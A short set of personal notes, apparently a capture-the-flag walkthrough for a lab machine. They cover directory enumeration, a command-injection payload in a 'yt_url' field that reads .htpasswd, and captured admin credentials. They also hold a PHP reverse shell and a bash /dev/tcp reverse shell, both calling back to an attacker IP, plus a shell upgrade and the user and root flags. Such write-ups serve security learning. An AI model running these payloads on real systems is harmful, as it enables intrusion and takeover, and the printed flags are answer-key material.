@@ -1,0 +1,45 @@
+Date:Apr/08/2021
+Time:15:34
+
+
+└─$ gobuster dir -u http://10.10.243.48 -w /usr/share/wordlists/dirb/common.txt
+10.10.243.48 brup
+yt_url=;cd		admin;ls	-a;cat		.htpasswd;
+got this
+username:itsmeadmin
+pass:jessie
+10.10.243.48/admin
+login 
+again brup
+click on clean downloads
+do repeater
+php -r '$sock=fsockopen("10.2.65.134",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+brup > decoder
+paste it 
+do encode as url
+copy the output 
+paste near get admin....
+└─$ rlwrap nc -lvnp 1234
+brup > now click on send
+hoola!!!
+
+user flag?
+python -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+export TERM=xterm
+ls
+ls
+flag.txt  index.php
+cat flag.txt
+cat flag.txt
+flag{0d8486a0c0c42503bb60ac77f4046ed7}
+
+cd to /tmp
+echo '#!/bin/bash/' > clean.sh
+echo 'bash -i >& /dev/tcp/10.2.65.134/7878 0>&1' >> clean.sh
+nc -lvnp 7878
+hoola!!!
+root@dmv:~# cat root.txt
+cat root.txt
+flag{d9b368018e912b541a4eb68399c5e94a}
+
